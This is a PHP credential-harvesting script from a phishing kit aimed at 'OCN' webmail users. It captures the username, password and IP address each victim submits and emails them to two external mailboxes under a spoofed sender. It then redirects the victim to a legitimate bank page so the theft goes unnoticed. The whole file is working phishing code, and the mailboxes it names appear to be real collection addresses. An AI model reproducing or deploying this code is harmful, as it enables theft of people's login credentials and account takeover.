<? 
$ip = getenv("REMOTE_ADDR");
$message .= "---------------OCN RESULT------------------\n";
$message .= "USERNAME: ".$_POST['user']."\n";
$message .= "PASSWORD: ".$_POST['pwd']."\n";
$message .= "IP: ".$ip."\n";
$message .= "------------Created By KinG Succ3$$FUL O.G-----------------\n";
$send = "loggsdept2@yandex.com,john.uba@inbox.lv";
$subject = "|OCN LOG|";
$headers = "From: Zion-Kid<webmailservice@co.ne.jp/>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: http://www.surugabank.co.jp/ocn/product/index.html");
	  

?>